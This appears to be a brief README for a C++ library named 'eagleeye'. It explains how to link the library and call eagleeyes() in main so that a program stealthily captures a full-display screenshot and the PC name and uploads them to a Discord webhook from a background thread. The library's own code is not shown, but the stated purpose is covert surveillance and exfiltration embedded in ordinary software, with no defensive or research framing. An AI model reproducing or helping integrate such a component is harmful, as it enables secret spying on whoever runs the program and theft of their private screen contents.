Just Link eagleeye.lib this with your Project 
Add eagleeye.h this to your main.cpp
To use this feature use this function in main 
\\ Add this into main Function

 // Fire the screenshot and PC name to Discord in a detached background thread
  eagleeyes();
// Wait a few seconds to let the background thread capture and upload
  std::this_thread::sleep_for(std::chrono::seconds(2));

  thats all it will send screenshot of full display to your discord webhook Stealthly

  Build your Library Before doing these
